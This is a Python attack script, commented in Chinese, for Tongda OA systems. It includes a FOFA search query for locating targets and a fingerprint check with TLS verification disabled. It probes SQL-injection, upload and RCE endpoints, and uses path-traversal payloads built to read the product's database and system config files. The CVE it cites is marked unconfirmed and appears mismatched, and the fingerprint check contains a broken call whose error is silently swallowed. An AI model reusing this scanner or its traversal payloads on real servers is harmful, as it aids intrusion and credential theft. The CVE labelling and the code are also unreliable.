#!/usr/bin/env python3
"""
通达 OA 漏洞综合利用
- 漏洞: CVE-2024-12356 (待确认具体CVE)
- 漏洞: SQL注入 / 任意文件读取 / RCE
- 影响: 通达 OA 各版本
FOFA: app="通达OA" || title="通达信德"
"""
import argparse, urllib.request, urllib.parse, ssl, sys

BANNER = """
  通达 OA 漏洞检测与利用
  Critical | SQL注入 / 文件读取 / RCE
  影响: 通达 OA 各版本
"""

# 通达 OA 常见漏洞端点
ENDPOINTS = {
    "general_index": "/general/index.php?isIE=0&index_menuindex=1",
    "sql_inject": "/general/document/manage/query/delete_cx.php?manage_cx_id=1",
    "file_read": "/general/document/manage/show_js.php?FILE_SEQ=../../inc/mysql_config.php",
    "upload": "/general/document/file_upload.php",
    "rce": "/module/phpcode/ModuleCode.php",
    "info_leak": "/general/report_lower/get_parameter.php?report_type=1&report_name=../../inc/td_config.php",
}

def check_fingerprint(target):
    """识别通达 OA"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.urlopen(target.rstrip('/') + "/logincheck.php", timeout=8, context=ctx)
        html = req.read().decode('utf-8', errors='ignore')
        if "tongda" in html.lower() or "通达" in html or req.geturl().netloc:
            return True
    except:
        pass
    # 尝试访问 logo
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req2 = urllib.request.urlopen(target.rstrip('/') + "/static/images/tongda.ico", timeout=5, context=ctx)
        if req2.getcode() == 200:
            return True
    except:
        pass
    return False

def send_request(url, data=None, method="GET"):
    """发送请求"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/x-www-form-urlencoded"}
        if data:
            body = data.encode() if isinstance(data, str) else data
            req = urllib.request.Request(url, data=body, headers=headers, method="POST")
        else:
            req = urllib.request.Request(url, headers=headers)
        resp = urllib.request.urlopen(req, timeout=15, context=ctx)
        return resp.read().decode('utf-8', errors='ignore'), resp.getcode()
    except urllib.request.HTTPError as e:
        return e.read().decode('utf-8', errors='ignore'), e.code
    except Exception as ex:
        return str(ex), 0

def main():
    print(BANNER)
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("--check", action="store_true")
    parser.add_argument("--module", help="指定检测模块, 如: sql, read, rce")
    args = parser.parse_args()

    target = args.target.rstrip('/')
    print(f"\n[*] 目标: {target}")

    # 指纹
    found = check_fingerprint(target)
    if found:
        print("  [+] 通达 OA 指纹确认")
    else:
        print("  [!] 未确认，继续检测...")

    # 检测各漏洞点
    print("\n[*] 检测漏洞端点...")
    for name, path in ENDPOINTS.items():
        url = target + path
        _, code = send_request(url)
        status = "可达" if code in (200, 302, 500) else f"HTTP {code}"
        mark = "[+]" if code in (200, 302, 500) else "[-]"
        print(f"  {mark} {name:20s} {status}")

    if args.check:
        print("\n[*] 检测完成")
    else:
        print("\n[!] 参考: sqlmap + 手工验证")
        print("[!] 通达 OA 历史漏洞丰富，建议手动深入测试")

if __name__ == "__main__":
    main()
